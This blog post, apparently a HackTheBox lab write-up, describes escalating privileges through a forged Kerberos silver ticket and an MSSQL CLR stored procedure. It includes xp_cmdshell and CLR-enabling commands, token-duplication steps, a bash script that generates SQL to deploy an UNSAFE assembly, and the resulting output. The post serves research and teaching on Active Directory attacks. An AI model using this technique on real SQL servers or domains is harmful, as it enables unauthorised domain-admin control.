---
title: "Silver Tickets and MSSQL: Privesc Without SeImpersonatePrivilege"
categories:
- Misc
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2026-02-07-silver-ticket-mssql-clr
tags:
- active directory
- kerberos
- mssql
- windows
---

I ran into an interesting situation while reviewing [Signed](https://app.hackthebox.com/machines/Signed) on HackTheBox: We get MSSQL access through a silver ticket, which leads to admin privileges on the MSSQL service - but the service account had been stripped of all useful privileges. 

The process token looked like this:
```
SeIncreaseQuotaPrivilege (Disabled)
SeChangeNotifyPrivilege (Enabled)
SeCreateGlobalPrivilege (Enabled)
SeIncreaseWorkingSetPrivilege (Disabled)
```

No `SeImpersonatePrivilege`, `SeManageVolumePrivilege` or `SeAssignPrimaryTokenPrivilege`. The service account (`mssqlsvc`) was a normal domain user - not in any admin groups, not running as `NT SERVICE\MSSQLSERVER` or `LocalSystem`. The usual potato exploits wouldn't work here, so it got me curious. The intended path on this machine was to use `xp_cmdshell` to get into this stripped user's context and continue from there.

## Silver Ticket

Since the KDC is not involved in validating service tickets (the service decrypts them itself), we control the PAC and can claim arbitrary group memberships like Domain Admins, Enterprise Admins, BUILTIN\Administrators and so on.

The SQL server was using this forged identity for certain operations but not for others. `OPENROWSET(BULK)` for instance could read files from `C:\Users\Administrator\Desktop\` (including the root flag), which is not something `mssqlsvc` should be able to do. With SA privileges we also were able to run `xp_cmdshell` but this put us into a normal user context without any special privileges:

```
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';

User Name       SID                                      
  =============== =========================================
  signed\mssqlsvc S-1-5-21-4088429403-1159899800-2753317549
...

Privilege Name                Description                
  ============================= ===========================
  SeIncreaseQuotaPrivilege      Adjust memory quotas for a 
  SeChangeNotifyPrivilege       Bypass traverse checking   
  SeCreateGlobalPrivilege       Create global objects      
  SeIncreaseWorkingSetPrivilege Increase a process working 
...
```

So the question was - why does `OPENROWSET(BULK)` work?

## First Attempt: Thread Token

The first thing I tried from within a CLR stored procedure was checking for a thread impersonation token. The idea was that SQL Server might keep the caller's identity on the CLR execution thread:

```csharp
OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, false, out threadToken);
// Result: error 1008 (ERROR_NO_TOKEN)
```

No luck. SQL Server only impersonates for specific operations like `OPENROWSET`. The CLR worker thread runs under the service account's identity, not the caller's.

## Second Attempt: SqlContext.WindowsIdentity

SQL Server does however expose the caller's Windows identity to CLR code through `SqlContext.WindowsIdentity`. This is a .NET `WindowsIdentity` object, and for a Kerberos-authenticated connection it wraps the actual Windows token created from the ticket's PAC data.

I was not expecting much, but the result was pretty good!

```
SqlContext.WindowsIdentity: SIGNED\mssqlsvc

Caller token privileges (26):
    SeIncreaseQuotaPrivilege (Enabled)
    SeSecurityPrivilege (Enabled)
    SeTakeOwnershipPrivilege (Enabled)
    SeDebugPrivilege (Enabled)
    SeImpersonatePrivilege (Enabled)
    ... all 26 enabled

Caller token groups (18):
    S-1-5-21-...-512 (Enabled)      <-- Domain Admins
    S-1-5-32-544 (Enabled)          <-- BUILTIN\Administrators
    S-1-5-21-...-519 (Enabled)      <-- Enterprise Admins
    ...
```

Same user principal (`mssqlsvc`), but the token from `SqlContext.WindowsIdentity` has 26 privileges - all enabled - and carries the forged admin group memberships. The process token has 4 stripped privileges and no interesting groups.

The next step was to duplicate this token into a primary token for `CreateProcessAsUser`. But...

```csharp
IntPtr callerToken = SqlContext.WindowsIdentity.Token;
DuplicateTokenEx(callerToken, MAXIMUM_ALLOWED, ...);
// Result: error 5 (ACCESS_DENIED)
```

The handle from `WindowsIdentity.Token` is managed by the .NET runtime and does not carry `TOKEN_DUPLICATE` access. So we have a token with admin privileges that we can see but not use?

## The Working Approach

The trick is to go through `.Impersonate()` first. `WindowsIdentity.Impersonate()` internally calls the Win32 API to set the caller's identity as the thread impersonation token. Once the thread is impersonating, we can call `OpenThreadToken` to get a handle with proper access rights:

1. `SqlContext.WindowsIdentity` - get the caller's identity
2. `.Impersonate()` - sets the thread impersonation token
3. `OpenThreadToken(TOKEN_ALL_ACCESS)` - fresh handle with full access
4. `DuplicateTokenEx` - convert to primary token
5. `Undo()` the managed impersonation
6. `CreateProcessAsUser` with the primary token

The launched process runs with all the privileges and group memberships from the forged PAC.

## Proof of Concept

This CLR stored procedure implements the technique. It takes a process and arguments, extracts the privileged token and launches the process with `CreateProcessAsUser`: [https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c](https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c).

### Building and Deploying

```
csc /target:library /out:SilverTokenPoC.dll SilverTokenPoC.cs /r:System.Data.dll
```

This helper automatically builds the SQL commands copy paste ready:

```bash
#!/bin/bash

set -e

if [ $# -lt 4 ]; then
    echo "Usage: $0 <dll_path> <assembly_name> <proc_name> <class.method> [proc_params]"
    echo ""
    echo "Example:"
    echo "  $0 SilverTokenPoC.dll SilverTokenPoC silver_token_exec \\"
    echo "    'SilverTokenPoC.SilverTokenPoC.silver_token_exec' \\"
    echo "    '@process NVARCHAR(260),@arguments NVARCHAR(4000)'"
    exit 1
fi

DLL="$1"
ASM_NAME="$2"
PROC_NAME="$3"
EXTERNAL="$4"
PARAMS="${5:-}"

if [ ! -f "$DLL" ]; then
    echo "Error: $DLL not found" >&2
    exit 1
fi

HEX=$(xxd -p "$DLL" | tr -d '\n')
TOTAL=${#HEX}
CHUNK=4000 

echo "- CLR Assembly Deploy Script"
echo "- Generated from: $(basename "$DLL") ($(wc -c < "$DLL" | tr -d ' ') bytes)"
echo "- Chunked for SQL shells with terminal paste limits"
echo ""
echo "- Step 1: Enable CLR"
echo "EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
echo "EXEC sp_configure 'clr enabled',1;RECONFIGURE;"
echo ""
echo "- Step 2: Trust the assembly (SQL 2017+)"
echo "CREATE TABLE #b(d VARBINARY(MAX));"

OFFSET=0
FIRST=1
while [ $OFFSET -lt $TOTAL ]; do
    CHUNK_HEX="${HEX:$OFFSET:$CHUNK}"
    if [ $FIRST -eq 1 ]; then
        echo "INSERT #b VALUES(0x${CHUNK_HEX});"
        FIRST=0
    else
        echo "UPDATE #b SET d=d+0x${CHUNK_HEX};"
    fi
    OFFSET=$((OFFSET + CHUNK))
done

echo "DECLARE @h VARBINARY(64)=(SELECT HASHBYTES('SHA2_512',d) FROM #b);EXEC sys.sp_add_trusted_assembly @hash=@h,@description=N'${ASM_NAME}';"
echo ""
echo "- Step 3: Create assembly"
echo "DECLARE @b VARBINARY(MAX)=(SELECT d FROM #b);CREATE ASSEMBLY ${ASM_NAME} FROM @b WITH PERMISSION_SET=UNSAFE;DROP TABLE #b;"
echo ""
echo "- Step 4: Create procedure"
if [ -n "$PARAMS" ]; then
    echo "CREATE PROCEDURE dbo.${PROC_NAME} ${PARAMS} AS EXTERNAL NAME ${EXTERNAL}"
else
    echo "CREATE PROCEDURE dbo.${PROC_NAME} AS EXTERNAL NAME ${EXTERNAL}"
fi
```

We run the script to build the commands and paste them into the SQL shell.

```bash
./clr_to_sql.sh SilverTokenPoC.dll SilverTokenPoC silver_token_exec 'SilverTokenPoC.SilverTokenPoC.silver_token_exec' '@process NVARCHAR(260),@arguments NVARCHAR(4000)' 
...
- Step 1: Enable CLR
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'clr enabled',1;RECONFIGURE;

- Step 2: Trust the assembly (SQL 2017+)
CREATE TABLE #b(d VARBINARY(MAX));
...
```

We then execute it:

```sql
EXEC dbo.silver_token_exec @process = N'whoami', @arguments = N'/all';
...
[*] Process token privileges:
    SeIncreaseQuotaPrivilege (Disabled)
    SeChangeNotifyPrivilege (Enabled)
    SeCreateGlobalPrivilege (Enabled)
    SeIncreaseWorkingSetPrivilege (Disabled)

[+] SqlContext identity: SIGNED\mssqlsvc

[*] Caller token privileges:
    SeIncreaseQuotaPrivilege (Enabled)
    SeMachineAccountPrivilege (Enabled)
    SeSecurityPrivilege (Enabled)
    SeTakeOwnershipPrivilege (Enabled)
    SeLoadDriverPrivilege (Enabled)
    SeSystemProfilePrivilege (Enabled)
    SeSystemtimePrivilege (Enabled)
    SeProfileSingleProcessPrivilege (Enabled)
    SeIncreaseBasePriorityPrivilege (Enabled)
    SeCreatePagefilePrivilege (Enabled)
    SeBackupPrivilege (Enabled)
    SeRestorePrivilege (Enabled)
    SeShutdownPrivilege (Enabled)
    SeDebugPrivilege (Enabled)
    SeSystemEnvironmentPrivilege (Enabled)
    SeChangeNotifyPrivilege (Enabled)
    SeRemoteShutdownPrivilege (Enabled)
    SeUndockPrivilege (Enabled)
    SeEnableDelegationPrivilege (Enabled)
    SeManageVolumePrivilege (Enabled)
    SeImpersonatePrivilege (Enabled)
    SeCreateGlobalPrivilege (Enabled)
    SeIncreaseWorkingSetPrivilege (Enabled)
    SeTimeZonePrivilege (Enabled)
    SeCreateSymbolicLinkPrivilege (Enabled)
    SeDelegateSessionUserImpersonatePrivilege (Enabled)

[*] Caller token groups:
    S-1-5-21-4088429403-1159899800-2753317549-512 (Enabled) ***
    S-1-1-0 (Enabled)
    S-1-5-32-544 (Enabled) ***
    S-1-5-32-554 (Enabled)
    S-1-5-32-545 (Enabled)
    S-1-5-2 (Enabled)
    S-1-5-11 (Enabled)
    S-1-5-15 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-513 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-518 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-519 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-520 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-1105 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-2345841878 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-4100997547 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-1052248003 (Enabled)
    S-1-5-21-4088429403-1159899800-2753317549-1466107430 (Enabled)
    S-1-16-12288 (Disabled)
...
```

## Why This Works

Three properties come together here:

**Silver tickets carry arbitrary PAC data.** The KDC does not validate service tickets - the service decrypts and trusts them directly. Whatever group memberships the attacker puts in the PAC end up in the Windows logon session.

**SQL Server builds a real Windows token from the PAC.** When a Kerberos-authenticated client connects, SQL Server delegates to the Windows security subsystem to create a logon session. The resulting token reflects the PAC groups verbatim. There is no independent validation against Active Directory.

**`SqlContext.WindowsIdentity` exposes this token to CLR code.** The `WindowsIdentity` object wraps the real Windows token from the authenticated session. The `.Impersonate()` -> `OpenThreadToken` -> `DuplicateTokenEx` sequence gives us a usable primary token with full access rights.

## References

- [Microsoft - SqlContext.WindowsIdentity](https://learn.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqlcontext.windowsidentity)
- [Microsoft - Impersonation in SQL CLR](https://techcommunity.microsoft.com/blog/sqlserver/impersonation-in-sql-clr/383101)
- [Microsoft - CLR Integration Security](https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration/security/clr-integration-code-access-security)
- [ADSecurity - Kerberos Silver Tickets](https://adsecurity.org/?p=2011)
